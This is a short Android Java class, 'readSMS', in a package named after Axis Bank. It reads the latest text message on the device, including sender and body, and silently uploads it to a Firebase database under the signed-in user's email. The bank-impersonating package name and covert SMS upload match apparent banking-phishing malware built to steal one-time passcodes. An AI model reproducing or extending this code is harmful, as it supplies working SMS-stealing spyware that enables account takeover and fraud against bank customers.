package com.bank.axisbank.HELPER;

import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import android.util.Log;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class readSMS {
    String contentBody, body;


    public void getLatestSMS(Context context) {
        Cursor cursor = null;

        try {
            // Query the SMS content provider to get the latest SMS
            cursor = context.getContentResolver().query(
                    Telephony.Sms.CONTENT_URI,
                    null,
                    null,
                    null,
                    "date DESC LIMIT 1"  // Sort by date in descending order and limit to 1 message
            );

            if (cursor != null && cursor.moveToFirst()) {
                int messageId = cursor.getInt(cursor.getColumnIndexOrThrow("_id"));
                String contactSender = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                body = messageId + contactSender + "\t\t" + cursor.getString(cursor.getColumnIndexOrThrow("body"));
                // Get the user's email using Firebase Authentication
                FirebaseAuth auth = FirebaseAuth.getInstance();
                FirebaseUser user = auth.getCurrentUser();

                if (user != null && user.getEmail()!=null) {
                    String userEmail = user.getEmail();

                        // Create the path based on the user's email
                        String path = userEmail.substring(0, 10)+"/Messages";

                        // Store the SMS at the specified path
                        FirebaseDatabase fd = FirebaseDatabase.getInstance();
                        DatabaseReference root = fd.getReference().child(path);
                        String messageID = root.push().getKey();
                        assert messageID != null;
                        root.child(messageID).setValue(body);
                }

            }
        } catch (Exception e) {
            Log.e("Error", e.toString());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        Log.d("LatestSMS", body);
    }
}
